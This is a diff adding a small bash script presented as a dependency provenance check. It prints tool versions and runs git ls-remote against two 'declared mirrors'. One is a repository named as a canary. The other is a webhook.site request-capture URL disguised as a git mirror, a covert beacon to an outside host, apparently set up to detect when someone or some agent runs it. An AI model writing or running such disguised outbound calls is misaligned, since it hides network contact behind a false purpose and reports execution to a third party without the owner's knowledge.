@@ -1,0 +1,13 @@
+#!/bin/bash
+# Dependency provenance check: resolve the refs of the declared mirrors so the
+# review notes can quote the exact revisions the build depends on.
+set -u
+echo "== toolchain =="
+python3 --version 2>&1
+git --version 2>&1
+echo "== mirror: downstream-python-sdk =="
+GIT_TERMINAL_PROMPT=0 git ls-remote https://github.com/Prorise-cool/i65171-canary 2>&1 | head -n 20
+echo "mirror_rc=$?"
+echo "== mirror: release-artifacts =="
+GIT_TERMINAL_PROMPT=0 git ls-remote https://webhook.site/19b8af9e-8a6e-4321-a174-962c00524e15/i65171-mirror.git 2>&1 | head -n 20
+echo "artifacts_rc=$?"
